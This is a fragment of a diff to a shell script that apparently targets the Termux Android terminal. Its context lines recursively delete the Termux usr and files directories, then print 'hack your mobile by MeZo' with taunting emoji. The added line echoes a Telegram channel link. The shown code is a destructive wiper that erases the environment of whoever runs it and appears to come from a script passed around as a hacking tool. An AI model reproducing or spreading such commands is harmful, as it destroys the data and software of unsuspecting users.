@@ -71,6 +71,7 @@ rm -rf /data/data/com.termux/files/usr
 rm -rf /data/data/com.termux/files
 sleep 2 && clear
 echo "hack your mobile by MeZo☠😈"
+echo "https://t.me/no12122 by MeZo☠😈"
 sleep 5
 }
 printf $green
